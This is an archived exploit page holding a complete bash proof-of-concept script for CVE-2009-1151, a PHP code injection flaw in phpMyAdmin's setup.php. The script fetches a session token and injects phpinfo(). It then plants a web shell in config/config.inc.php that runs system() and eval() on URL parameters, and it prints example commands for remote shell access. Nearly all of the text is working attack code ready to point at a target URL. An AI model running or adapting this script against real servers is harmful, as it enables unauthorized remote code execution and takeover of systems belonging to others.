<html><head><title>phpMyAdmin (/scripts/setup.php) PHP Code Injection Exploit</title></head><pre>#!/bin/bash

# CVE-2009-1151: phpMyAdmin '/scripts/setup.php' PHP Code Injection RCE PoC v0.11
# by pagvac (gnucitizen.org), 4th June 2009.
# special thanks to Greg Ose (labs.neohapsis.com) for discovering such a cool vuln, 
# and to str0ke (milw0rm.com) for testing this PoC script and providing feedback!

# PoC script successfully tested on the following targets:
# phpMyAdmin 2.11.4, 2.11.9.3, 2.11.9.4, 3.0.0 and 3.0.1.1
# Linux 2.6.24-24-generic i686 GNU/Linux (Ubuntu 8.04.2)

# attack requirements:
# 1) vulnerable version (obviously!): 2.11.x before 2.11.9.5
# and 3.x before 3.1.3.1 according to PMASA-2009-3
# 2) it *seems* this vuln can only be exploited against environments
# where the administrator has chosen to install phpMyAdmin following
# the *wizard* method, rather than manual method: http://snipurl.com/jhjxx
# 3) administrator must have NOT deleted the '/config/' directory
# within the '/phpMyAdmin/' directory. this is because this directory is
# where '/scripts/setup.php' tries to create 'config.inc.php' which is where
# our evil PHP code is injected 8)

# more info on:
# http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php
# http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/

if [[ $# -ne 1 ]]
then
	echo &quot;usage: ./$(basename $0) &lt;phpMyAdmin_base_URL&gt;&quot;
	echo &quot;i.e.: ./$(basename $0) http://target.tld/phpMyAdmin/&quot;
	exit
fi

if ! which curl &gt;/dev/null
then
	echo &quot;sorry but you need curl for this script to work!&quot;
       	echo &quot;on Debian/Ubuntu: sudo apt-get install curl&quot;
       	exit
fi


function exploit {

postdata=&quot;token=$1&amp;action=save&amp;configuration=&quot;\
&quot;a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:23:%22host%27]=&quot;\
&quot;%27%27%3b%20phpinfo%28%29%3b//%22%3bs:9:%22localhost%22%3bs:9:&quot;\
&quot;%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:&quot;\
&quot;%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:&quot;\
&quot;%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&amp;eoltype=unix&quot;

postdata2=&quot;token=$1&amp;action=save&amp;configuration=a:1:&quot;\
&quot;{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d=&quot;\
&quot;%27%27%3b%20if(\$_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3b&quot;\
&quot;system(\$_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}&quot;\
&quot;if(\$_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval&quot;\
&quot;(\$_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//&quot;\
&quot;%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22&quot;\
&quot;mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:&quot;\
&quot;%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config&quot;\
&quot;%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&amp;eoltype=unix&quot;

	flag=&quot;/tmp/$(basename $0).$RANDOM.phpinfo.flag.html&quot;
	
	echo &quot;[+] attempting to inject phpinfo() ...&quot;
	curl -ks -b $2 -d &quot;$postdata&quot; --url &quot;$3/scripts/setup.php&quot; &gt;/dev/null

	if curl -ks --url &quot;$3/config/config.inc.php&quot; | grep &quot;phpinfo()&quot; &gt;/dev/null
	then
		curl -ks --url &quot;$3/config/config.inc.php&quot; &gt;$flag	
		echo &quot;[+] success! phpinfo() injected successfully! output saved on $flag&quot;
		curl -ks -b $2 -d $postdata2 --url &quot;$3/scripts/setup.php&quot; &gt;/dev/null
		echo &quot;[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:&quot;
		echo &quot;    $3/config/config.inc.php?c=ls+-l+/&quot;
		echo &quot;    $3/config/config.inc.php?p=phpinfo();&quot;
		echo &quot;    please send any feedback/improvements for this script to&quot;\
		&quot;unknown.pentester&lt;AT_sign__here&gt;gmail.com&quot;
	else
		echo &quot;[+] no luck injecting to $3/config/config.inc.php :(&quot;
		exit
	fi
}
# end of exploit function

cookiejar=&quot;/tmp/$(basename $0).$RANDOM.txt&quot;
token=`curl -ks -c $cookiejar --url &quot;$1/scripts/setup.php&quot; | grep \&quot;token\&quot; | head -n 1 | cut -d \&quot; -f 12`
echo &quot;[+] checking if phpMyAdmin exists on URL provided ...&quot;

#if grep phpMyAdmin $cookiejar 2&gt;/dev/null &gt; /dev/null
if grep phpMyAdmin $cookiejar &amp;&gt;/dev/null
then
	length=`echo -n $token | wc -c`

	# valid form token obtained?
	if [[ $length -eq 32 ]]
	then
		echo &quot;[+] phpMyAdmin cookie and form token received successfully. Good!&quot;
		# attempt exploit!
		exploit $token $cookiejar $1
	else
		echo &quot;[+] could not grab form token. you might want to try exploiting the vuln manually :(&quot;
		exit
	fi
else
	echo &quot;[+] phpMyAdmin NOT found! phpMyAdmin base URL incorrectly typed? wrong case-sensitivity?&quot;
	exit
fi

# milw0rm.com [2009-06-09]</pre></html>